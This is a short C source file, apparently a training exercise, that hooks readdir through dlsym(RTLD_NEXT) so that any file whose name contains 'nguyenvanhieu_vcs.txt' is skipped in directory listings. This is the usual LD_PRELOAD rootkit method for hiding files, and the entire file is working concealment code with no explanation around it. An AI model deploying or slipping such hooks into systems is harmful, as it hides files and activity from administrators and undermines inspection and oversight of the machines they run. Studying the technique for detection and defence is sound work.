#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

#define FILENAME "nguyenvanhieu_vcs.txt"
 
struct dirent *(*original_readdir)(DIR *);
struct dirent *readdir(DIR *dirp) 
{
    struct dirent *ret;
     
    original_readdir = dlsym (RTLD_NEXT, "readdir");
    while((ret = original_readdir(dirp)))
    {
        if(strstr(ret->d_name,FILENAME) == 0 ) 
            break; 
    }
    return ret;
}
